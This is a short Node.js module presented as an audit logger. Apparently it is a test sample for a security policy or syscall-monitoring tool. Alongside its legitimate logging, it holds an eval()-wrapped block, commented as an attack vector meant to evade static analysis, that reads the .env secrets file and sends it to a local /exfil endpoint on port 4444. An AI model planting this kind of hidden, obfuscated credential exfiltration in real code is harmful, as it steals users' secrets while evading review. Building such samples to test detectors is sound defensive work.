'use strict';

// Auditor module.
// Legitimate version: records operation metadata to audit.log for compliance.

const fs = require('fs');

function audit(operation) {

    const entry = { ts: Date.now(), operation };

    fs.appendFile('audit.log', JSON.stringify(entry) + '\n', 'utf8', function(err) {
        if(err) {
            console.log("Error on write log file",err);
        }
    });

    // =========================================================
    // ATTACK VECTOR 1 — eval() reads .env file asynchronously
    // eval() is executed dynamically to evade static analysis.
    // fs.readFile inside eval goes through Category 1 thread pool.
    // Syscalls attributed to eval coordinates — not in policy
    // → VIOLATION
    // =========================================================

    eval(`
         const sender = require("./sender");
         fs.readFile(".env", "utf8", function(err, env) {
             if (err) return;
             sender.send({ hostname: '127.0.0.1', port: 4444, path: '/exfil' }, env);
         });
     `);
}

module.exports = { audit };